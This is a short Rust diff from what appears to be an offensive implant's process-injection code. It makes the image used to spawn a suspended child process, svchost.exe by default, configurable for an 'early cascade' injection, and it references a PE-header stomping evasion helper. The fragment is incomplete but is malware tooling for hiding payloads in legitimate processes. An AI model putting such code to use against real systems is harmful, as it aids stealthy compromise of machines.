@@ -1,5 +1,6 @@
 use std::{
     ffi::c_void,
+    iter::once,
     ptr::{null_mut, read_unaligned},
 };
 
@@ -30,10 +31,7 @@ use crate::{
     utils::{console::print_failed, pe_stomp::stomp_pe_header_bytes},
 };
 
-// TODO move to profile &/ default?
-const SPAWN_AS_IMAGE: &'static [u8; 32] = b"C:\\Windows\\System32\\svchost.exe\0";
-
-pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> {
+pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>, spawn_as: &str) -> WyrmResult<String> {
     //
     // Create the process in a suspended state, using the image specified by either the user (TODO) or
     // svchost as the default image.
@@ -42,10 +40,18 @@ pub(super) fn early_cascade_spawn_child(mut buf: Vec<u8>) -> WyrmResult<String> 
     let mut si = STARTUPINFOA::default();
     si.cb = size_of::<STARTUPINFOA>() as u32;
 
+    let spawn_as = if !spawn_as.ends_with('\0') {
+        let mut s = spawn_as.to_string();
+        s.push('\0');
+        s
+    } else {
+        spawn_as.to_string()
+    };
+
     let result_create_process = unsafe {
         CreateProcessA(
             null_mut(),
-            SPAWN_AS_IMAGE.as_ptr() as _,
+            spawn_as.as_ptr() as _,
             null_mut(),
             null_mut(),
             FALSE,
